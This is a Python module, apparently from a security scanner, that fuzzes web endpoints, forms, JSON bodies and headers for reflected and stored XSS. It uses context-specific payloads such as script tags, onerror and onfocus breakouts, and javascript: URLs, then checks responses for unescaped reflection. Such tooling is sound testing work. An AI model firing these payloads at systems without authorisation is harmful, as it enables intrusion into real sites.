"""
Cross-Site Scripting (XSS) Detection Engine and Collector.

Actively fuzzes discovered endpoint parameters (GET query params, POST form & JSON bodies,
and HTTP headers) for Reflected and Stored Cross-Site Scripting vulnerabilities using AuthenticatedHttpClient.

Supports multi-context payload generation (HTML body, attribute double/single/unquoted,
JavaScript strings, and URL attributes), context detection, stateful POST-then-GET stored validation,
and strict HTML entity-encoding false positive suppression (&lt;, &gt;, &quot;, &#39;, &#x27;, &amp;).
Emits high-confidence Evidence(category="xss"), updates mission vulnerabilities,
and expands attack surface graph nodes with HAS_ENDPOINT and HAS_VULNERABILITY edges.
"""
from __future__ import annotations

from enum import Enum
import html
from html.parser import HTMLParser
import json
import logging
import re
from typing import Any, Dict, List, Optional, Set, Tuple
import urllib.parse
import uuid

from argus.collectors.base import BaseCollector
from argus.evidence.model import Evidence, ProvenanceData
from argus.graph.node import Node
from argus.http.client import AuthenticatedHttpClient, HttpResponse

logger = logging.getLogger(__name__)


class XSSContext(Enum):
    """Enumeration of HTML syntactic contexts where user reflection can occur."""

    HTML_BODY = "html_body"
    ATTRIBUTE_DOUBLE = "attribute_double"
    ATTRIBUTE_SINGLE = "attribute_single"
    ATTRIBUTE_UNQUOTED = "attribute_unquoted"
    SCRIPT_STRING_DOUBLE = "script_string_double"
    SCRIPT_STRING_SINGLE = "script_string_single"
    SCRIPT_BLOCK = "script_block"
    URL_ATTRIBUTE = "url_attribute"
    COMMENT = "comment"
    UNKNOWN = "unknown"


# Standard probe routes and common parameters for XSS discovery
DEFAULT_XSS_PROBE_ROUTES: List[str] = [
    "/search",
    "/view",
    "/profile",
    "/feedback",
    "/contact",
    "/comments",
    "/login",
    "/post",
    "/messages",
    "/api/search",
    "/api/feedback",
    "/api/comments",
]

COMMON_XSS_PARAMS: Set[str] = {
    "q", "query", "search", "name", "user", "username", "msg", "message",
    "comment", "feedback", "text", "title", "content", "redirect", "url",
    "next", "return", "callback", "email", "author", "input", "data", "id",
}


class XSSPayloadGenerator:
    """
    Generates unique canary tokens, context-specific escape payloads,
    multi-context default suites, and stored XSS test payloads.
    """

    def __init__(self):
        pass

    def generate_canary(self, prefix: str = "argusxss") -> str:
        """
        Generates a unique alphanumeric canary string with a UUID suffix.
        """
        token = uuid.uuid4().hex[:8]
        clean_prefix = re.sub(r"[^a-zA-Z0-9]", "", prefix) or "argusxss"
        return f"{clean_prefix}{token}"

    def get_canary_probe(self, canary: str) -> str:
        """
        Returns a benign canary probe for initial reflection and context discovery.
        """
        return str(canary)

    def get_context_payloads(self, context: XSSContext, canary: str) -> List[Dict[str, str]]:
        """
        Returns targeted payload dictionaries containing 'payload' and 'breakout'
        tailored for the specified HTML syntactic context.
        """
        if context == XSSContext.HTML_BODY:
            return [
                {"payload": f"<script>/*{canary}*/</script>", "breakout": f"<script>/*{canary}*/</script>"},
                {"payload": f"<img src=x onerror=alert('{canary}')>", "breakout": f"<img src=x onerror=alert('{canary}')>"},
                {"payload": f"<svg onload=alert('{canary}')>", "breakout": f"<svg onload=alert('{canary}')>"},
                {"payload": f"<b>{canary}</b>", "breakout": f"<b>{canary}</b>"},
            ]
        elif context == XSSContext.ATTRIBUTE_DOUBLE:
            return [
                {"payload": f'"><script>/*{canary}*/</script>', "breakout": '"><script>'},
                {"payload": f'" onfocus="alert(\'{canary}\')', "breakout": '" onfocus="'},
                {"payload": f'" autofocus onfocus="alert(\'{canary}\')', "breakout": '" autofocus onfocus="'},
                {"payload": f'"><b>{canary}</b>', "breakout": '">' + f"<b>{canary}</b>"},
            ]
        elif context == XSSContext.ATTRIBUTE_SINGLE:
            return [
                {"payload": f"\'><script>/*{canary}*/</script>", "breakout": "\'><script>"},
                {"payload": f"' onfocus='alert(\"{canary}\")", "breakout": "' onfocus='"},
                {"payload": f"' autofocus onfocus='alert(\"{canary}\")", "breakout": "' autofocus onfocus='"},
                {"payload": f"'><b>{canary}</b>", "breakout": "'>" + f"<b>{canary}</b>"},
            ]
        elif context == XSSContext.ATTRIBUTE_UNQUOTED:
            return [
                {"payload": f" onfocus=alert('{canary}')", "breakout": " onfocus="},
                {"payload": f" autofocus onfocus=alert('{canary}')", "breakout": " autofocus onfocus="},
                {"payload": f"><script>/*{canary}*/</script>", "breakout": "><script>"},
            ]
        elif context == XSSContext.SCRIPT_STRING_DOUBLE:
            return [
                {"payload": f'";alert("{canary}");//', "breakout": '";alert('},
                {"payload": f'</script><script>alert("{canary}")</script>', "breakout": "</script><script>"},
                {"payload": f'"+alert("{canary}")+"', "breakout": '"+alert('},
            ]
        elif context == XSSContext.SCRIPT_STRING_SINGLE:
            return [
                {"payload": f"';alert('{canary}');//", "breakout": "';alert("},
                {"payload": f"</script><script>alert('{canary}')</script>", "breakout": "</script><script>"},
                {"payload": f"'+alert('{canary}')+'", "breakout": "'+alert("},
            ]
        elif context == XSSContext.SCRIPT_BLOCK:
            return [
                {"payload": f"alert('{canary}')", "breakout": f"alert('{canary}')"},
                {"payload": f"</script><script>alert('{canary}')</script>", "breakout": "</script><script>"},
            ]
        elif context == XSSContext.URL_ATTRIBUTE:
            return [
                {"payload": f"javascript:alert('{canary}')", "breakout": "javascript:alert"},
                {"payload": f"javascript:/*{canary}*/", "breakout": "javascript:"},
            ]
        elif context == XSSContext.COMMENT:
            return [
                {"payload": f"--> <script>/*{canary}*/</script>", "breakout": "--> <script>"},
                {"payload": f"--><img src=x onerror=alert('{canary}')>", "breakout": "--><img"},
            ]
        else:  # UNKNOWN
            return [
                {"payload": f"<script>/*{canary}*/</script>", "breakout": f"<script>/*{canary}*/</script>"},
                {"payload": f'"><script>/*{canary}*/</script>', "breakout": '"><script>'},
                {"payload": f"\'><script>/*{canary}*/</script>", "breakout": "\'><script>"},
                {"payload": f'";alert("{canary}");//', "breakout": '";alert('},
                {"payload": f"';alert('{canary}');//", "breakout": "';alert("},
                {"payload": f"<img src=x onerror=alert('{canary}')>", "breakout": f"<img src=x onerror=alert('{canary}')>"},
                {"payload": f"javascript:alert('{canary}')", "breakout": "javascript:alert"},
            ]

    def get_default_payload_suite(self, canary: str) -> List[Tuple[str, XSSContext, str]]:
        """
        Returns a multi-context payload suite covering Body, Attribute, Script, and URL contexts.
        Each entry is a tuple: (payload, context, breakout_marker).
        """
        return [
            (f"<script>/*{canary}*/</script>", XSSContext.HTML_BODY, f"<script>/*{canary}*/</script>"),
            (f"<img src=x onerror=alert('{canary}')>", XSSContext.HTML_BODY, f"<img src=x onerror=alert('{canary}')>"),
            (f"<svg onload=alert('{canary}')>", XSSContext.HTML_BODY, f"<svg onload=alert('{canary}')>"),
            (f'"><script>/*{canary}*/</script>', XSSContext.ATTRIBUTE_DOUBLE, '"><script>'),
            (f'" onfocus="alert(\'{canary}\')', XSSContext.ATTRIBUTE_DOUBLE, '" onfocus="'),
            (f"\'><script>/*{canary}*/</script>", XSSContext.ATTRIBUTE_SINGLE, "\'><script>"),
            (f"' onfocus='alert(\"{canary}\")", XSSContext.ATTRIBUTE_SINGLE, "' onfocus='"),
            (f" onfocus=alert('{canary}')", XSSContext.ATTRIBUTE_UNQUOTED, " onfocus="),
            (f'";alert("{canary}");//', XSSContext.SCRIPT_STRING_DOUBLE, '";alert('),
            (f"';alert('{canary}');//", XSSContext.SCRIPT_STRING_SINGLE, "';alert("),
            (f"javascript:alert('{canary}')", XSSContext.URL_ATTRIBUTE, "javascript:alert"),
        ]

    def get_stored_payload(self, canary: str) -> str:
        """
        Generates a high-confidence test payload for stored XSS validation.
        """
        return f"<b id=\"argus_stored_{canary}\">{canary}</b><script>/*{canary}*/</script>"


class _HTMLContextDetectorParser(HTMLParser):
    """
    Internal HTMLParser state machine for detecting the syntactic context of canary tokens.
    """

    def __init__(self, canary: str, raw_html: str):
        super().__init__()
        self.canary = canary
        self.raw_html = raw_html
        self.detected_context: XSSContext = XSSContext.UNKNOWN
        self.in_script: bool = False
        self.in_style: bool = False
        self.current_tag: Optional[str] = None

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]):
        tag_lower = tag.lower()
        self.current_tag = tag_lower
        if tag_lower == "script":
            self.in_script = True
        elif tag_lower == "style":
            self.in_style = True

        for attr_name, attr_value in attrs:
            if attr_value and self.canary in attr_value:
                attr_name_lower = attr_name.lower()
                if attr_name_lower in ("href", "src", "action", "formaction", "data") and attr_value.strip().lower().startswith("javascript:"):
                    self.detected_context = XSSContext.URL_ATTRIBUTE
                    return

                # Distinguish quoting style for this attribute
                attr_pattern = re.compile(
                    r'\b' + re.escape(attr_name) + r'\s*=\s*(["\']?)[^"\'\s>]*?' + re.escape(self.canary),
                    re.IGNORECASE,
                )
                m = attr_pattern.search(self.raw_html)
                if m:
                    quote_char = m.group(1)
                    if quote_char == '"':
                        self.detected_context = XSSContext.ATTRIBUTE_DOUBLE
                    elif quote_char == "'":
                        self.detected_context = XSSContext.ATTRIBUTE_SINGLE
                    else:
                        self.detected_context = XSSContext.ATTRIBUTE_UNQUOTED
                else:
                    self.detected_context = XSSContext.ATTRIBUTE_DOUBLE
                return

    def handle_endtag(self, tag: str):
        tag_lower = tag.lower()
        if tag_lower == "script":
            self.in_script = False
        elif tag_lower == "style":
            self.in_style = False
        self.current_tag = None

    def handle_data(self, data: str):
        if self.canary in data:
            if self.in_script:
                if f'"{self.canary}' in data or f'{self.canary}"' in data:
                    self.detected_context = XSSContext.SCRIPT_STRING_DOUBLE
                elif f"'{self.canary}" in data or f"{self.canary}'" in data:
                    self.detected_context = XSSContext.SCRIPT_STRING_SINGLE
                elif f"`{self.canary}" in data or f"{self.canary}`" in data:
                    self.detected_context = XSSContext.SCRIPT_STRING_DOUBLE
                else:
                    self.detected_context = XSSContext.SCRIPT_BLOCK
            elif not self.in_style:
                self.detected_context = XSSContext.HTML_BODY

    def handle_comment(self, data: str):
        if self.canary in data:
            self.detected_context = XSSContext.COMMENT


class XSSAnalyzer:
    """
    Parses and inspects HTTP responses for unescaped XSS reflections and persistence,
    strictly suppressing false positives when characters are entity-encoded.
    """

    # HTML Entity patterns
    ENTITY_PATTERNS = [
        re.compile(r"&(?:lt|#0*60|#x0*3c);", re.IGNORECASE),
        re.compile(r"&(?:gt|#0*62|#x0*3e);", re.IGNORECASE),
        re.compile(r"&(?:quot|#0*34|#x0*22);", re.IGNORECASE),
        re.compile(r"&(?:apos|#0*39|#x0*27);", re.IGNORECASE),
        re.compile(r"&(?:amp|#0*38|#x0*26);", re.IGNORECASE),
    ]

    NON_HTML_CONTENT_TYPES = [
        "application/json",
        "text/plain",
        "application/xml",
        "text/xml",
        "application/javascript",
        "text/javascript",
        "text/css",
        "application/pdf",
        "image/png",
        "image/jpeg",
        "image/gif",
        "image/webp",
        "application/octet-stream",
        "application/zip",
        "application/x-tar",
        "application/gzip",
    ]

    def is_properly_escaped(self, body: str, canary: str) -> bool:
        """
        Strictly checks whether special characters associated with the canary are HTML
        entity-encoded (&lt;, &gt;, &quot;, &#39;, &#x27;, &amp;), suppressing false positives.
        Returns True if the output is safely escaped, False if unescaped/vulnerable.
        """
        if not body or canary not in body:
            return True

        start = 0
        has_vulnerable_occurrence = False

        while True:
            idx = body.find(canary, start)
            if idx == -1:
                break

            before_canary = body[max(0, idx - 150):idx]

            # Extract all tags (both raw <tag and encoded &lt;tag) in before_canary
            tag_matches = list(re.finditer(
                r"(&(?:lt|#0*60|#x0*3c);|<)(/?)([a-zA-Z0-9]+)",
                before_canary,
                re.IGNORECASE,
            ))

            is_escaped = False
            if tag_matches:
                last_match = tag_matches[-1]
                last_tag_prefix = last_match.group(1)
                last_is_closing = bool(last_match.group(2))
                last_tag_name = last_match.group(3).lower()

                # If the last tag before canary was encoded with &lt;
                if last_tag_prefix.startswith("&"):
                    is_escaped = True
                elif last_tag_name in ("script", "img", "svg", "iframe", "b", "a", "body") and not last_is_closing:
                    # Raw dangerous tag directly enclosing or preceding the canary
                    has_vulnerable_occurrence = True
                    start = idx + len(canary)
                    continue

            # Check for attribute quote breakout and script execution (raw vs encoded)
            if not is_escaped:
                has_raw_breakout = bool(re.search(r'(?<!&quot;)(?<!&#34;)(?<!&#x22;)(?<!&#39;)(?<!&#x27;)["\']>\s*<(?:script|img|svg|iframe|b|a)\b', before_canary, re.IGNORECASE))
                has_raw_event = bool(re.search(r'(?<!&quot;)(?<!&#34;)(?<!&#x22;)(?<!&#39;)(?<!&#x27;)["\']\s*(?:on\w+|autofocus)\s*=\s*["\']?', before_canary, re.IGNORECASE))
                has_raw_unquoted_event = bool(re.search(r'\s+(?:on\w+|autofocus)\s*=\s*[^"\'\s>&]+', before_canary, re.IGNORECASE))
                has_raw_script_call = bool(re.search(r'(?:alert|confirm|prompt|console\.log)\s*\(', before_canary, re.IGNORECASE)) and ("<script" in before_canary and not re.search(r"&(?:lt|#0*60|#x0*3c);script", before_canary, re.IGNORECASE))
                has_raw_js_url = bool(re.search(r'(?:href|src|action)\s*=\s*["\']?javascript:[^"\'>]*?$', before_canary, re.IGNORECASE))

                if has_raw_breakout or has_raw_event or has_raw_unquoted_event or has_raw_script_call or has_raw_js_url:
                    has_vulnerable_occurrence = True

            start = idx + len(canary)

        if has_vulnerable_occurrence:
            return False

        return True

    def detect_context(self, raw_body: str, canary: str) -> XSSContext:
        """
        Parses raw HTML to identify the exact syntactic context of the canary reflection.
        """
        if not raw_body or canary not in raw_body:
            return XSSContext.UNKNOWN

        try:
            parser = _HTMLContextDetectorParser(canary, raw_body)
            parser.feed(raw_body)
            if parser.detected_context != XSSContext.UNKNOWN:
                return parser.detected_context
        except Exception as e:
            logger.debug(f"HTMLContextDetectorParser exception: {e}")

        # Fallback regex heuristics
        if re.search(r"<script[^>]*>[^<]*?" + re.escape(canary), raw_body, re.IGNORECASE):
            idx = raw_body.find(canary)
            snippet = raw_body[max(0, idx - 40):min(len(raw_body), idx + len(canary) + 40)]
            if "'" in snippet:
                return XSSContext.SCRIPT_STRING_SINGLE
            elif '"' in snippet:
                return XSSContext.SCRIPT_STRING_DOUBLE
            return XSSContext.SCRIPT_BLOCK

        if re.search(r'<[^>]+(?:href|src|action)=["\']?javascript:[^>]*?' + re.escape(canary), raw_body, re.IGNORECASE):
            return XSSContext.URL_ATTRIBUTE

        if re.search(r'<[^>]+\w+=["\'][^"\']*?' + re.escape(canary), raw_body, re.IGNORECASE):
            idx = raw_body.find(canary)
            snippet = raw_body[max(0, idx - 40):min(len(raw_body), idx + len(canary) + 40)]
            if "'" in snippet:
                return XSSContext.ATTRIBUTE_SINGLE
            return XSSContext.ATTRIBUTE_DOUBLE

        if re.search(r'<[^>]+\w+=[^"\'\s>]*?' + re.escape(canary), raw_body, re.IGNORECASE):
            return XSSContext.ATTRIBUTE_UNQUOTED

        if re.search(r'<!--[^>]*?' + re.escape(canary), raw_body):
            return XSSContext.COMMENT

        return XSSContext.HTML_BODY

    def analyze_reflected(
        self,
        resp: Optional[HttpResponse],
        canary: str,
        payload: str,
        context: Optional[XSSContext] = None,
    ) -> Optional[Dict[str, Any]]:
        """
        Verifies unescaped reflection and breakout in HTML body, attribute, script, or header context.
        Returns a structured finding dictionary on confirmation, or None if safe / false positive.
        """
        if resp is None:
            return None

        headers = getattr(resp, "headers", {}) or {}
        content_type = ""
        for hk, hv in headers.items():
            if hk.lower() == "content-type":
                content_type = hv.lower()
                break

        # Reject non-HTML/non-renderable content types
        if content_type:
            is_non_html = any(nht in content_type for nht in self.NON_HTML_CONTENT_TYPES)
            is_html_compatible = any(ht in content_type for ht in ("text/html", "application/xhtml+xml", "image/svg+xml"))
            if is_non_html and not is_html_compatible:
                return None

        raw_body = (
            getattr(resp, "raw_body", None)
            or getattr(resp, "body", None)
            or getattr(resp, "text", "")
            or ""
        )

        if not raw_body or canary not in raw_body:
            return None

        # Check entity-encoding false positive suppression
        if self.is_properly_escaped(raw_body, canary):
            return None

        # Detect syntactic context
        detected_context = context if (context is not None and context != XSSContext.UNKNOWN) else self.detect_context(raw_body, canary)

        # Context-specific breakout validation
        idx = raw_body.find(canary)
        snippet_start = max(0, idx - 80)
        snippet_end = min(len(raw_body), idx + len(canary) + 80)
        snippet = raw_body[snippet_start:snippet_end].strip()

        # Severity determination
        severity = "high"
        if detected_context == XSSContext.COMMENT or "header" in payload.lower():
            severity = "medium"

        template_id = f"xss-reflected-{detected_context.value.replace('_', '-')}"

        return {
            "xss_type": "reflected",
            "context": detected_context.value,
            "template_id": template_id,
            "severity": severity,
            "confidence": 0.95,
            "snippet": snippet,
            "payload": payload,
            "canary": canary,
        }

    def analyze_stored(
        self,
        resp: Optional[HttpResponse],
        canary: str,
        payload: str,
    ) -> Optional[Dict[str, Any]]:
        """
        Verifies persistence of an unescaped XSS payload in a re-fetched page.
        Returns a structured finding dictionary with severity='critical' on confirmation.
        """
        if resp is None:
            return None

        headers = getattr(resp, "headers", {}) or {}
        content_type = ""
        for hk, hv in headers.items():
            if hk.lower() == "content-type":
                content_type = hv.lower()
                break

        if content_type:
            is_non_html = any(nht in content_type for nht in self.NON_HTML_CONTENT_TYPES)
            is_html_compatible = any(ht in content_type for ht in ("text/html", "application/xhtml+xml", "image/svg+xml"))
            if is_non_html and not is_html_compatible:
                return None

        raw_body = (
            getattr(resp, "raw_body", None)
            or getattr(resp, "body", None)
            or getattr(resp, "text", "")
            or ""
        )

        if not raw_body or canary not in raw_body:
            return None

        if self.is_properly_escaped(raw_body, canary):
            return None

        idx = raw_body.find(canary)
        snippet_start = max(0, idx - 80)
        snippet_end = min(len(raw_body), idx + len(canary) + 80)
        snippet = raw_body[snippet_start:snippet_end].strip()

        return {
            "xss_type": "stored",
            "context": "html_body",
            "template_id": "xss-stored",
            "severity": "critical",
            "confidence": 0.95,
            "snippet": snippet,
            "payload": payload,
            "canary": canary,
        }


class XSSCollector(BaseCollector):
    """
    Multi-mode Cross-Site Scripting (XSS) vulnerability detection collector.
    Fuzzes GET query parameters, POST form bodies, POST JSON bodies, and HTTP headers,
    and performs stateful POST-then-GET testing for Stored XSS persistence.
    """

    def __init__(
        self,
        http_client: Optional[Any] = None,
        payload_generator: Optional[XSSPayloadGenerator] = None,
        analyzer: Optional[XSSAnalyzer] = None,
        timeout: float = 10.0,
    ):
        self.http_client = http_client
        self.generator = payload_generator or XSSPayloadGenerator()
        self.analyzer = analyzer or XSSAnalyzer()
        self.timeout = timeout

    def _extract_candidate_endpoints(self, mission: Any) -> List[Dict[str, Any]]:
        """
        Extracts and normalizes target candidate endpoints from mission state.
        """
        candidates: List[Dict[str, Any]] = []
        seen_urls: Set[str] = set()

        raw_target = getattr(mission, "target", "") or ""
        default_base = raw_target if (raw_target.startswith("http://") or raw_target.startswith("https://")) else f"http://{raw_target}" if raw_target else "http://localhost"

        # 1. Base hosts from mission.live_hosts
        base_hosts: List[str] = []
        for host_entry in getattr(mission, "live_hosts", []) or []:
            if isinstance(host_entry, dict):
                h_url = host_entry.get("url") or host_entry.get("host") or ""
            else:
                h_url = str(host_entry) if host_entry else ""
            if h_url:
                if not h_url.startswith("http://") and not h_url.startswith("https://"):
                    h_url = f"http://{h_url}"
                base_hosts.append(h_url.rstrip("/"))

        if not base_hosts and default_base:
            base_hosts.append(default_base.rstrip("/"))

        # 2. Extract from mission.endpoints
        for ep in getattr(mission, "endpoints", []) or []:
            if not ep:
                continue

            method = "GET"
            params_dict: Dict[str, Any] = {}
            body_data: Any = None
            headers_dict: Dict[str, str] = {}

            if isinstance(ep, dict):
                raw_url = ep.get("url") or ep.get("path") or ""
                method = (ep.get("method") or "GET").upper()
                params_dict = dict(ep.get("params") or {})
                body_data = ep.get("body")
                headers_dict = dict(ep.get("headers") or {})
            else:
                raw_url = str(ep)

            if not raw_url:
                continue

            if not raw_url.startswith("http://") and not raw_url.startswith("https://"):
                full_url = urllib.parse.urljoin(default_base.rstrip("/") + "/", raw_url.lstrip("/"))
            else:
                full_url = raw_url

            parsed = urllib.parse.urlparse(full_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"

            # Extract query parameters from URL if not provided
            if not params_dict and parsed.query:
                parsed_qs = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                params_dict = {k: v[0] if isinstance(v, list) and len(v) == 1 else v for k, v in parsed_qs.items()}

            if full_url not in seen_urls:
                seen_urls.add(full_url)
                candidates.append({
                    "url": full_url,
                    "base_url": base_url,
                    "path": parsed.path or "/",
                    "method": method,
                    "params": params_dict,
                    "body": body_data,
                    "headers": headers_dict,
                    "source": "mission.endpoints",
                })

        # 3. Fallback standard probe routes on candidate base hosts
        for base_url in base_hosts:
            for probe_path in DEFAULT_XSS_PROBE_ROUTES:
                for param in ("q", "search", "name", "comment", "msg"):
                    probe_url = f"{base_url.rstrip('/')}{probe_path}?{param}=test"
                    if probe_url not in seen_urls:
                        seen_urls.add(probe_url)
                        parsed = urllib.parse.urlparse(probe_url)
                        candidates.append({
                            "url": probe_url,
                            "base_url": base_url,
                            "path": parsed.path,
                            "method": "GET",
                            "params": {param: "test"},
                            "body": None,
                            "headers": {},
                            "source": "default_probe",
                        })

        return candidates

    def _execute_request(
        self,
        mission: Any,
        method: str,
        url: str,
        params: Optional[Dict[str, Any]] = None,
        data: Optional[Dict[str, Any]] = None,
        json_data: Optional[Any] = None,
        headers: Optional[Dict[str, str]] = None,
        cookies: Optional[Dict[str, str]] = None,
    ) -> Optional[HttpResponse]:
        """
        Dispatches HTTP request using the injected or standard AuthenticatedHttpClient.
        """
        method = method.upper()
        try:
            if self.http_client is not None:
                if method == "GET" and hasattr(self.http_client, "get"):
                    try:
                        return self.http_client.get(
                            mission, url, params=params, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        try:
                            return self.http_client.get(url, params=params, headers=headers, cookies=cookies)
                        except TypeError:
                            return self.http_client.get(url)
                elif method == "POST" and hasattr(self.http_client, "post"):
                    try:
                        return self.http_client.post(
                            mission, url, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        try:
                            return self.http_client.post(url, data=data, json=json_data, headers=headers, cookies=cookies)
                        except TypeError:
                            return self.http_client.post(url)
                elif hasattr(self.http_client, "request"):
                    try:
                        return self.http_client.request(
                            mission, method, url, params=params, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout
                        )
                    except TypeError:
                        return self.http_client.request(method, url)
                elif callable(self.http_client):
                    return self.http_client(url)
                return None

            with AuthenticatedHttpClient(timeout=self.timeout, max_retries=1) as client:
                if method == "GET":
                    return client.get(mission, url, params=params, headers=headers, cookies=cookies, timeout=self.timeout)
                elif method == "POST":
                    return client.post(mission, url, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout)
                else:
                    return client.request(mission, method, url, params=params, data=data, json=json_data, headers=headers, cookies=cookies, timeout=self.timeout)
        except Exception as e:
            logger.debug(f"XSSCollector request failed for {url}: {e}")
            return None

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes multi-mode Cross-Site Scripting (XSS) detection across candidate endpoints.
        """
        raw_mission = getattr(mission, "_mission", mission)
        candidates = self._extract_candidate_endpoints(raw_mission)
        if not candidates:
            logger.info("XSSCollector: No candidate endpoints or hosts to fuzz.")
            return []

        logger.info(f"XSSCollector: Fuzzing {len(candidates)} candidate endpoint(s)...")

        detected_evidence: List[Evidence] = []
        confirmed_vuln_keys: Set[str] = set()

        for candidate in candidates:
            orig_url = candidate["url"]
            base_url = candidate["base_url"]
            parsed_url = urllib.parse.urlparse(orig_url)
            method = candidate.get("method", "GET")
            raw_params = dict(candidate.get("params") or {})
            body_data = candidate.get("body")
            headers_data = dict(candidate.get("headers") or {})

            # -------------------------------------------------------------
            # Vector 1: GET Query Parameter Fuzzing
            # -------------------------------------------------------------
            if raw_params:
                for param_name in list(raw_params.keys()):
                    canary = self.generator.generate_canary("rxss")
                    probe = self.generator.get_canary_probe(canary)

                    # Step 1: Send canary probe
                    probe_params = dict(raw_params)
                    probe_params[param_name] = probe
                    probe_query = urllib.parse.urlencode(probe_params, doseq=True)
                    probe_target = urllib.parse.urlunparse((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        parsed_url.params,
                        probe_query,
                        parsed_url.fragment,
                    ))

                    resp = self._execute_request(raw_mission, "GET", probe_target, params=probe_params, headers=headers_data)
                    raw_body = getattr(resp, "raw_body", None) or getattr(resp, "body", None) or ""

                    if resp and canary in raw_body:
                        # Context discovered
                        context = self.analyzer.detect_context(raw_body, canary)
                        context_payloads = self.generator.get_context_payloads(context, canary)

                        for item in context_payloads:
                            payload = item["payload"]
                            mutated_params = dict(raw_params)
                            mutated_params[param_name] = payload
                            mut_query = urllib.parse.urlencode(mutated_params, doseq=True)
                            target_url = urllib.parse.urlunparse((
                                parsed_url.scheme,
                                parsed_url.netloc,
                                parsed_url.path,
                                parsed_url.params,
                                mut_query,
                                parsed_url.fragment,
                            ))

                            payload_resp = self._execute_request(raw_mission, "GET", target_url, params=mutated_params, headers=headers_data)
                            if not payload_resp:
                                continue

                            analysis = self.analyzer.analyze_reflected(payload_resp, canary, payload, context)
                            if analysis:
                                vuln_key = f"{parsed_url.path}:{param_name}:{analysis['template_id']}"
                                if vuln_key not in confirmed_vuln_keys:
                                    confirmed_vuln_keys.add(vuln_key)
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=target_url,
                                        base_url=base_url,
                                        param=param_name,
                                        param_type="query",
                                        payload=payload,
                                        status_code=getattr(payload_resp, "status_code", 200) or 200,
                                        analysis=analysis,
                                    )
                                    detected_evidence.append(ev)
                                    break
                    else:
                        # Fallback: test default payload suite
                        suite = self.generator.get_default_payload_suite(canary)
                        for payload, ctx, marker in suite:
                            mutated_params = dict(raw_params)
                            mutated_params[param_name] = payload
                            mut_query = urllib.parse.urlencode(mutated_params, doseq=True)
                            target_url = urllib.parse.urlunparse((
                                parsed_url.scheme,
                                parsed_url.netloc,
                                parsed_url.path,
                                parsed_url.params,
                                mut_query,
                                parsed_url.fragment,
                            ))

                            payload_resp = self._execute_request(raw_mission, "GET", target_url, params=mutated_params, headers=headers_data)
                            if not payload_resp:
                                continue

                            analysis = self.analyzer.analyze_reflected(payload_resp, canary, payload, ctx)
                            if analysis:
                                vuln_key = f"{parsed_url.path}:{param_name}:{analysis['template_id']}"
                                if vuln_key not in confirmed_vuln_keys:
                                    confirmed_vuln_keys.add(vuln_key)
                                    ev = self._create_evidence_and_update_state(
                                        mission=mission,
                                        target_url=target_url,
                                        base_url=base_url,
                                        param=param_name,
                                        param_type="query",
                                        payload=payload,
                                        status_code=getattr(payload_resp, "status_code", 200) or 200,
                                        analysis=analysis,
                                    )
                                    detected_evidence.append(ev)
                                    break

            # -------------------------------------------------------------
            # Vector 2: POST Form Body Fuzzing
            # -------------------------------------------------------------
            if method == "POST" or isinstance(body_data, dict):
                form_fields = list(body_data.keys()) if isinstance(body_data, dict) and body_data else ["comment", "message", "query", "search", "name", "feedback"]
                for field in form_fields:
                    canary = self.generator.generate_canary("postxss")
                    suite = self.generator.get_default_payload_suite(canary)
                    for payload, ctx, marker in suite:
                        post_body = dict(body_data) if isinstance(body_data, dict) else {}
                        post_body[field] = payload

                        resp = self._execute_request(raw_mission, "POST", orig_url, data=post_body, headers=headers_data)
                        if not resp:
                            continue

                        analysis = self.analyzer.analyze_reflected(resp, canary, payload, ctx)
                        if analysis:
                            vuln_key = f"{parsed_url.path}:{field}:post_form:{analysis['template_id']}"
                            if vuln_key not in confirmed_vuln_keys:
                                confirmed_vuln_keys.add(vuln_key)
                                ev = self._create_evidence_and_update_state(
                                    mission=mission,
                                    target_url=orig_url,
                                    base_url=base_url,
                                    param=field,
                                    param_type="post_form",
                                    payload=payload,
                                    status_code=getattr(resp, "status_code", 200) or 200,
                                    analysis=analysis,
                                )
                                detected_evidence.append(ev)
                                break

            # -------------------------------------------------------------
            # Vector 3: POST JSON Body Fuzzing
            # -------------------------------------------------------------
            json_fields = ["query", "search", "name", "comment", "message", "input", "data"]
            for field in json_fields:
                canary = self.generator.generate_canary("jsonxss")
                suite = self.generator.get_default_payload_suite(canary)
                for payload, ctx, marker in suite:
                    json_body = {field: payload}
                    resp = self._execute_request(raw_mission, "POST", orig_url, json_data=json_body, headers=headers_data)
                    if not resp:
                        continue

                    analysis = self.analyzer.analyze_reflected(resp, canary, payload, ctx)
                    if analysis:
                        vuln_key = f"{parsed_url.path}:{field}:post_json:{analysis['template_id']}"
                        if vuln_key not in confirmed_vuln_keys:
                            confirmed_vuln_keys.add(vuln_key)
                            ev = self._create_evidence_and_update_state(
                                mission=mission,
                                target_url=orig_url,
                                base_url=base_url,
                                param=field,
                                param_type="post_json",
                                payload=payload,
                                status_code=getattr(resp, "status_code", 200) or 200,
                                analysis=analysis,
                            )
                            detected_evidence.append(ev)
                            break

            # -------------------------------------------------------------
            # Vector 4: HTTP Header Fuzzing
            # -------------------------------------------------------------
            header_names = ["User-Agent", "Referer", "X-Forwarded-For"]
            for hname in header_names:
                canary = self.generator.generate_canary("hdrxss")
                suite = self.generator.get_default_payload_suite(canary)
                for payload, ctx, marker in suite:
                    mutated_hdrs = dict(headers_data)
                    mutated_hdrs[hname] = payload

                    resp = self._execute_request(raw_mission, method, orig_url, params=raw_params if method == "GET" else None, headers=mutated_hdrs)
                    if not resp:
                        continue

                    analysis = self.analyzer.analyze_reflected(resp, canary, payload, ctx)
                    if analysis:
                        analysis["severity"] = "medium"
                        vuln_key = f"{parsed_url.path}:{hname}:header:{analysis['template_id']}"
                        if vuln_key not in confirmed_vuln_keys:
                            confirmed_vuln_keys.add(vuln_key)
                            ev = self._create_evidence_and_update_state(
                                mission=mission,
                                target_url=orig_url,
                                base_url=base_url,
                                param=hname,
                                param_type="header",
                                payload=payload,
                                status_code=getattr(resp, "status_code", 200) or 200,
                                analysis=analysis,
                            )
